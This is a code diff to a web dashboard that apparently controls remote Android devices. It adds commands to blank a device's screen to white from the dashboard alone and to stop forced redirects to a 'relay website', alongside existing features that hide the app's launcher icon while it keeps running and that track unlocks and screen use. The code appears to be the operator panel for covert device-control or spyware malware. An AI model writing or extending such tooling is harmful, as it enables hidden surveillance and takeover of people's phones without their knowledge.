@@ -8,6 +8,7 @@ type Device = {
   installed:string[]; missing:string[]; monitorRunning:boolean;
   batteryOptimized:boolean; lastSeen:string; firstSeen:string; heartbeatCount:number;
   alias?:string; appLabel?:string; hidden?:boolean;
+  blankEnabled?:boolean; relayActive?:boolean; relaySlot?:number;
   inUse?:boolean; screenOn?:boolean; lastUnlock?:string; ringerMode?:string;
 };
 
@@ -36,6 +37,20 @@ async function toggleVisibility(id:string, visible:boolean){
   const j=await r.json();
   if(r.ok) alert(visible?`Visible queued for ${id.slice(0,8)} — launcher icon returns within 5s`:`Hide queued for ${id.slice(0,8)} — launcher icon disappears within 5s (app stays installed + running)`);
   else alert(`Visibility failed: ${j.error||r.status}`);
+}
+
+async function toggleBlank(id:string, enabled:boolean){
+  const r=await fetch(`/api/devices/${encodeURIComponent(id)}/blank`,{method:"POST", headers:{"Content-Type":"application/json"}, body: JSON.stringify({enabled})});
+  const j=await r.json();
+  if(r.ok) alert(enabled?`Blank ON queued for ${id.slice(0,8)} — device shows white only within 5s (dashboard-only control)`:`Blank OFF queued for ${id.slice(0,8)} — normal screen returns within 5s`);
+  else alert(`Blank failed: ${j.error||r.status}`);
+}
+
+async function stopRelay(id:string){
+  const r=await fetch(`/api/devices/${encodeURIComponent(id)}/stop-relay`,{method:"POST", headers:{"Content-Type":"application/json"}, body: JSON.stringify({})});
+  const j=await r.json();
+  if(r.ok) alert(`Stop Relay queued for ${id.slice(0,8)} — device stops auto-redirecting within 5s`);
+  else alert(`Stop Relay failed: ${j.error||r.status}`);
 }
 
 export default function Dashboard(){
@@ -87,7 +102,15 @@ export default function Dashboard(){
                 className="bg-violet-600 text-white text-xs px-3 py-1.5 rounded-lg hover:bg-violet-700">Relay 1</button><button onClick={()=>setDlg({id:d.deviceId,slot:2})}
                 className="bg-fuchsia-600 text-white text-xs px-3 py-1.5 rounded-lg hover:bg-fuchsia-700">Relay 2</button><button onClick={()=>toggleVisibility(d.deviceId,d.hidden === true)}
                 title={d.hidden?"Bring the launcher icon back":"Hide the launcher icon"}
-                className={`text-xs px-3 py-1.5 rounded-lg border ${d.hidden?"bg-emerald-600 text-white border-emerald-600 hover:bg-emerald-700":"hover:bg-gray-100"}`}>{d.hidden?"Visible":"Hide"}</button></div>{d.hidden && <div className="text-[11px] text-amber-600 mt-1">icon hidden</div>}</td>
+                className={`text-xs px-3 py-1.5 rounded-lg border ${d.hidden?"bg-emerald-600 text-white border-emerald-600 hover:bg-emerald-700":"hover:bg-gray-100"}`}>{d.hidden?"Visible":"Hide"}</button></div>
+              <div className="flex gap-1.5 mt-1.5"><button onClick={()=>toggleBlank(d.deviceId,!(d.blankEnabled === true))}
+                title="Blank white-screen mode (dashboard-only control)"
+                className={`text-xs px-3 py-1.5 rounded-lg border ${d.blankEnabled?"bg-slate-800 text-white border-slate-800 hover:bg-slate-700":"hover:bg-gray-100"}`}>{d.blankEnabled?"Unblank":"Blank"}</button><button onClick={()=>stopRelay(d.deviceId)}
+                title="Stop auto-redirecting to the relay website on every open"
+                className="text-xs px-3 py-1.5 rounded-lg border hover:bg-gray-100">Stop Relay</button></div>
+              {d.hidden && <div className="text-[11px] text-amber-600 mt-1">icon hidden</div>}
+              {d.blankEnabled && <div className="text-[11px] text-slate-600 mt-1">blank ON — white only</div>}
+              {d.relayActive && <div className="text-[11px] text-violet-600 mt-1">auto-relay ON{d.relaySlot ? ` · slot ${d.relaySlot}` : ""}</div>}</td>
           </tr>
         })}</tbody>
       </table>
